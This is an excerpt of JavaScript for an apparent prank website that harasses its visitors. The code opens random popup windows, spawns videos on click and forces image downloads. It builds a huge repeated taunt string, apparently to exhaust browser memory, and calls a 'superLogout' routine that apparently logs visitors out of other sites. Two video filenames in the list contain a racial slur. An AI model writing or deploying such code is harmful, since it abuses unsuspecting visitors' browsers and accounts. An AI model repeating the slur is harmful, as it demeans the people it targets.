...
const VIDEOS = [
  ...
  'media/videos/damnbird.mp4',
  'media/videos/berd.mp4',
  'media/videos/damnation.mp4',
  'media/videos/NIE.mp4',
  'media/videos/gratulacje.mp4' ,
  'media/videos/niggachain.mp4',
  'media/videos/merc.mp4',
  'media/videos/rocket.mp4',
  'media/videos/rage.mp4',
  'media/videos/fall.mp4',
  'media/videos/niggachain2.mp4',
]

const FILE_DOWNLOADS = [
  'media/images/ptok.jpg',
  'media/images/rotationbird.gif',
  'media/images/DAMN.jpg',
  'media/images/ptoszek.jpg',
  'media/images/zlyptok.jpg', //added by @imzeme
...
const PHRASES = [
  'hello my name is DAAAAMN',
  'DAAAAAAAAAAAMN',
  'are you a DAMN',
  'BOMBA',
  'im lowkey kinda DAAMN',
  'DaYYMMMMMN',
  'IT STARS WITH DAAAAAMN',
  'EMBRACE THE PUKEKO!'
]
...
const veryLongString = repeatStringNumTimes(repeatStringNumTimes('YOUVE BEEN DAMNEED!!1 ',100),1500) // - added by @9fm
...
function initParentWindow () {
  ...
  // Spawn multiple main-page videos
  for (let i = 0; i < 5; i++) {
    document.addEventListener("click", () => startVideo(), { once: true })
  }
...
function openWindow () {
  ...
  const video = getRandomArrayEntry(VIDEOS)
  const win = window.open(video, '', opts)
...
function activateLogout() {
  if (activated) return;
  activated = true;
  superLogout();    // ← Fixed: NO arguments
}
